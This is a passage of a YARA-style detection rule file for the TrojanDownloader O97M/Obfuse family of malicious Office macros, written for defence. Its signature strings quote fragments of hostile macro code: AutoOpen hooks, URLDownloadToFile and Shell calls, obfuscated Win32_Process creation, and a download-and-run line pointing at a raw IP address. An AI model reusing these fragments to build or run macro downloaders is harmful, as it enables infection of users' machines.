        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 22 20 2b 20 [0-20] 28 22 69 6e 5f 21 5f 5f 5f 5f 6d 5f 21 5f 5f 5f 5f 67 6d 5f 21 5f 5f 5f 5f 74 73 5f 21 5f 5f 5f 5f 3a 5f 21 5f 5f 5f 5f 57 5f 21 5f 5f 5f 5f 69 6e 5f 21 5f 5f 5f 5f 33 5f 21 5f 5f 5f 5f 32 5f 21 5f 5f 5f 5f 5f 5f 21 5f 5f 5f 5f 50 72 5f 21 5f 5f 5f 5f 6f 5f 21 5f 5f 5f 5f 5f 21 5f 5f 5f 5f 63 65 5f 21 5f 5f 5f 5f 73 5f 21 5f 5f 5f 5f 73 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 22 20 2b 20 [0-20] 28 22 69 6e 50 69 64 6f 72 6d 50 69 64 6f 72 67 6d 50 69 22 20 2b 20 22 64 6f 72 74 73 50 69 64 6f 72 3a 50 69 64 6f 72 57 50 69 64 6f 72 69 6e 50 69 64 22 20 2b 20 22 6f 72 33 50 69 64 6f 72 32 50 69 64 6f 72 5f 50 69 64 6f 72 50 22 20 2b 20 22 72 50 69 64 6f 72 6f 50 69 64 6f 72 50 69 64 6f 72 63 65 50 69 64 6f 72 73 50 69 64 6f 72 73 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-20] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KT_2147742872_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KT!MTB"
        threat_id = "2147742872"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "moc.lruc\\pmet\\swodniw\\:c" ascii //weight: 1
        $x_1_2 = "exe.nimdastib\\23metsys\\swodniw\\:c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KU_2147742885_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KU!MTB"
        threat_id = "2147742885"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mnuejwr NMV1.Text, Array(1, 2, 3, 4), NMV2.Text" ascii //weight: 1
        $x_1_2 = "Function Mnuejwr(uenjk66, bdjwj77, irweh88)" ascii //weight: 1
        $x_1_3 = "Sub Vberw(vbf)" ascii //weight: 1
        $x_1_4 = "GgopFrm.Show" ascii //weight: 1
        $x_1_5 = "URLDownloadToFile 0, mien55, mejnw33, 0, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KV_2147742897_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KV!MTB"
        threat_id = "2147742897"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \".jse\"" ascii //weight: 1
        $x_1_2 = {3d 20 54 72 69 6d 28 49 6e 74 28 53 74 72 28 56 61 6c 28 [0-22] 29 20 2f 20 31 30 30 30 30 30 30 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {54 65 78 74 3a 3d 22 3d 20 22 20 2b 20 [0-19] 20 2b 20 22 20 5c 2a 20 43 61 72 64 54 65 78 74 22 2c 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "= UserForm1.TextBox3.Text" ascii //weight: 1
        $x_1_5 = "MsgBox \"Number too large\", vbOKOnly" ascii //weight: 1
        $x_1_6 = ".CreateTextFile(file2savrsave, True, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KW_2147742907_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KW!MTB"
        threat_id = "2147742907"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 77 51 41 23 69 6e 6d 51 41 23 67 6d 51 41 23 74 73 51 41 23 3a 51 41 23 57 51 41 23 69 6e 51 41 23 33 51 41 23 32 51 41 23 5f 51 41 23 50 72 51 41 23 6f 51 41 23 51 41 23 63 65 51 41 23 73 51 41 23 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-20] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = "ShowWindow! _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KX_2147742925_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KX!MTB"
        threat_id = "2147742925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\".jse\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_3 = "FileName:=\"test_\" & DocNum & \".doc\"" ascii //weight: 1
        $x_1_4 = "UserForm1.TextBox1.Value" ascii //weight: 1
        $x_1_5 = "ActiveDocument.Bookmarks(\"\\Section\").Range.Copy" ascii //weight: 1
        $x_1_6 = ".ShellExecute (start)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KY_2147742927_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KY!MTB"
        threat_id = "2147742927"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 22 20 26 20 22 54 65 22 20 26 20 22 6d 70 5c [0-20] 22 20 26 20 22 2e 6a 22 20 26 20 22 73 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 43 3a 5c 57 69 6e 22 20 26 20 22 64 6f 77 73 5c 22 20 26 20 22 54 65 22 20 26 20 22 6d 70 5c [0-20] 22 20 26 20 22 2e 6a 22 20 26 20 22 73 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"new:13709620-C279-11CE-A49E-444553540000\"" ascii //weight: 1
        $x_1_4 = {4f 70 65 6e 20 [0-48] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_5 = ".Controls(0).Caption" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KZ_2147742931_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KZ!MTB"
        threat_id = "2147742931"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 52 65 70 6c 61 63 65 28 22 5c 65 72 72 6f 72 5f 6c 6f 67 2e [0-20] 22 2c 20 22 44 57 51 22 2c 20 22 22 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 52 65 70 6c 61 63 65 28 22 5c 65 72 72 6f 72 5f 6c 6f 67 2e [0-20] 22 2c 20 22 41 53 45 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Actions.Create(0)" ascii //weight: 1
        $x_1_4 = "nana & Chr(" ascii //weight: 1
        $x_1_5 = "soto & Chr(" ascii //weight: 1
        $x_1_6 = "cYear & \"-\" & Right(cMonth, 2) & \"-\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LC_2147742950_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LC!MTB"
        threat_id = "2147742950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 49 75 48 33 49 75 48 33 77 49 75 48 33 69 49 75 48 33 6e 6d 67 49 75 48 33 6d 74 49 75 48 33 73 49 75 48 33 49 75 48 33 3a 49 75 48 33 57 49 75 48 33 49 75 48 33 69 49 75 48 33 6e 33 49 75 48 33 32 5f 50 49 75 48 33 72 6f 49 75 48 33 63 49 75 48 33 65 49 75 48 33 73 73 49 75 48 33 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 79 69 77 61 77 69 79 69 77 61 79 69 77 61 79 69 77 61 6e 6d 67 6d 79 69 77 61 74 73 79 69 77 61 79 69 77 61 3a 79 69 77 61 79 69 77 61 57 69 79 69 77 61 79 69 77 61 6e 79 69 77 61 33 79 69 77 61 32 79 69 77 61 5f 79 69 77 61 50 72 6f 79 69 77 61 63 65 79 69 77 61 73 73 79 69 77 61 79 69 77 61 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 20 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-20] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = ".ShowWindow! =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LC_2147742950_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LC!MTB"
        threat_id = "2147742950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run (lVkRwEGx + cOV2135l + RZYQpU8J" ascii //weight: 1
        $x_1_2 = ".Run (eybkLzvI + ZtLbeYNJ + XBRQpcjG)" ascii //weight: 1
        $x_1_3 = "Timer - temp < sec" ascii //weight: 1
        $x_1_4 = "Replace(\"!!!ht\", \"!\", \"\")" ascii //weight: 1
        $x_1_5 = "Replace(\"!!!tp\", \"!\", \"\")" ascii //weight: 1
        $x_1_6 = "Replace(\"^^^W\", \"^\", \"\")" ascii //weight: 1
        $x_1_7 = "Replace(\"r!!!i\", \"!\", \"\")" ascii //weight: 1
        $x_1_8 = "Replace(\"^pt.^^Sh\", \"^\", \"\")" ascii //weight: 1
        $x_1_9 = "Replace(\"!!!ell\", \"!\", \"\")" ascii //weight: 1
        $x_1_10 = "Replace(\"/@@@\", \"@\", \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LD_2147742956_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LD!MTB"
        threat_id = "2147742956"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 61 70 70 22 20 26 20 [0-8] 29 20 26 20 [0-16] 20 26 20 22 70 75 74 74 79 2e 73 63 72 22}  //weight: 1, accuracy: Low
        $x_1_2 = ".DataType = \"bin.base64\"" ascii //weight: 1
        $x_1_3 = ".createElement(\"b64\")" ascii //weight: 1
        $x_1_4 = "Debug.Print Error(" ascii //weight: 1
        $x_1_5 = ".Text =" ascii //weight: 1
        $x_1_6 = ".nodeTypedValue" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LF_2147742975_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LF!MTB"
        threat_id = "2147742975"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \".xsl\"" ascii //weight: 1
        $x_1_2 = "= \"appdata\"" ascii //weight: 1
        $x_1_3 = "= \"&h\"" ascii //weight: 1
        $x_1_4 = "= New WshShell" ascii //weight: 1
        $x_1_5 = {26 20 43 68 72 28 [0-21] 20 26 20 4d 69 64 24 28}  //weight: 1, accuracy: Low
        $x_1_6 = "Debug.Print Error(" ascii //weight: 1
        $x_1_7 = {4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LG_2147742980_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LG!MTB"
        threat_id = "2147742980"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"verinstere.xls\"" ascii //weight: 1
        $x_1_2 = "& \".htm\", _" ascii //weight: 1
        $x_1_3 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-7] 2e 54 61 67 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LH_2147742986_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LH!MTB"
        threat_id = "2147742986"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"\"%appdata%\\jet6633\"\"\"" ascii //weight: 1
        $x_1_2 = "+ \"\\Ap\" + \"pD\" + \"a\" + \"ta\\R\" + \"oa\" + \"mi\" + \"ng\" & \"\\\"" ascii //weight: 1
        $x_1_3 = "& \"', '%APPDATA%\\je' + 't66' + '33\\as' + 'pot' + 'o.ex' + 'e')\"  'regex.exe" ascii //weight: 1
        $x_1_4 = ".Tag +" ascii //weight: 1
        $x_1_5 = "Put #1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LI_2147743015_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LI!MTB"
        threat_id = "2147743015"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"http://107.173.219.115:4560/press1.exe\" & _" ascii //weight: 1
        $x_1_2 = "& \" cmd \" & \"/c\" & _" ascii //weight: 1
        $x_1_3 = {22 25 54 45 4d 50 25 5c [0-20] 2e 65 78 65 22 20 26 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 28 [0-20] 2c 20 52 69 67 68 74 28 52 69 67 68 74 28 4d 69 64 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LK_2147743043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LK!MTB"
        threat_id = "2147743043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 [0-16] 28 29 20 26 20 22 5c [0-16] 2e 78 22 20 26 20 [0-20] 28 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"appdata\"" ascii //weight: 1
        $x_1_3 = "= New WshShell" ascii //weight: 1
        $x_1_4 = "\"sl\"" ascii //weight: 1
        $x_1_5 = "Debug.Print Error(" ascii //weight: 1
        $x_1_6 = ".Text &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LL_2147743045_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LL!MTB"
        threat_id = "2147743045"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Iownhrtt()" ascii //weight: 1
        $x_1_2 = "TERQA2.Text, 874, \"nujneg53\"" ascii //weight: 1
        $x_1_3 = "URLDownloadToFile 0, miiwthb33, mnwuiubh22, 0, 0" ascii //weight: 1
        $x_1_4 = "Shell meuhw" ascii //weight: 1
        $x_1_5 = "VthjneFmtr.Show" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LM_2147743055_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LM!MTB"
        threat_id = "2147743055"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {39 32 2e 36 33 2e 31 39 32 2e 32 31 36 2f [0-10] 2e 65 78 65 23 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "CmdLine = \"\"\"\" & Filename & \"\"\"\"" ascii //weight: 1
        $x_1_3 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 [0-12] 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LM_2147743055_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LM!MTB"
        threat_id = "2147743055"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 77 61 5f 3a 77 61 5f 3a 77 69 77 61 5f 3a 6e 6d 67 77 61 5f 3a 6d 74 73 3a 77 61 5f 3a 57 77 61 5f 3a 77 61 5f 3a 77 61 5f 3a 69 77 61 5f 3a 6e 33 77 61 5f 3a 32 5f 50 77 61 5f 3a 72 6f 77 61 5f 3a 63 65 77 61 5f 3a 73 73 77 61 5f 3a 22 29 29 2e 43 72 65 61 74 65 28 [0-20] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-20] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = ".ShowWindow! =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LO_2147743074_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LO!MTB"
        threat_id = "2147743074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 5f 3a 5f 61 5f 3a 5f 61 77 5f 3a 5f 61 69 6e 6d 67 6d 5f 3a 5f 61 74 73 3a 57 5f 3a 5f 61 69 6e 33 5f 3a 5f 61 32 5f 50 5f 3a 5f 61 72 6f 63 65 73 5f 3a 5f 61 73 5f 3a 5f 61 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-20] 2c 20 52 65 70 6c 61 63 65 28 22 75 65 67 77 37 32 62 64 6a 61 5f 75 65 67 77 37 32 62 64 6a 61 3a 75 65 67 77 37 32 62 64 6a 61 5f 75 65 67 77 37 32 62 64 6a 61 75 65 67 77 37 32 62 64 6a 61 61 75 65 67 77 37 32 62 64 6a 61 22 2c 20 22 75 65 67 77 37 32 62 64 6a 61 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ShowWindow! =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LO_2147743074_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LO!MTB"
        threat_id = "2147743074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CLng(((278 - (wdStyleQuote - -446#))" ascii //weight: 1
        $x_1_2 = "761 - 157#) - (-1.35449735449735 * -378)" ascii //weight: 1
        $x_1_3 = "wdJapan Or wdLineSpaceDouble" ascii //weight: 1
        $x_1_4 = "Asc(Left$(Mid$(MO5e72L_9MbeCK_vL3dTdA_AjA3D3m, IaEUnsWWW80PD)" ascii //weight: 1
        $x_1_5 = "(88959 + -398#) Xor (7312 + -75#)" ascii //weight: 1
        $x_1_6 = "Hex(CLng((CLng(((115438 - 260#)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LQ_2147743078_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LQ!MTB"
        threat_id = "2147743078"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 20 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_5 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_6 = ".Close" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LS_2147743096_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LS!MTB"
        threat_id = "2147743096"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 61 62 63 73 77 61 62 63 73 69 61 62 63 73 6e 6d 67 61 62 63 73 6d 74 73 3a 61 62 63 73 57 69 61 62 63 73 6e 33 61 62 63 73 32 5f 61 62 63 73 50 72 6f 61 62 63 73 63 65 61 62 63 73 73 73 61 62 63 73 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-20] 2c 20 52 65 70 6c 61 63 65 28 22 67 68 75 61 73 77 61 67 68 75 61 73 77 62 67 68 75 61 73 77 67 68 75 61 73 77 63 67 68 75 61 73 77 73 67 68 75 61 73 77 22 2c 20 22 67 68 75 61 73 77 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ShowWindow! =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LT_2147743125_0
{
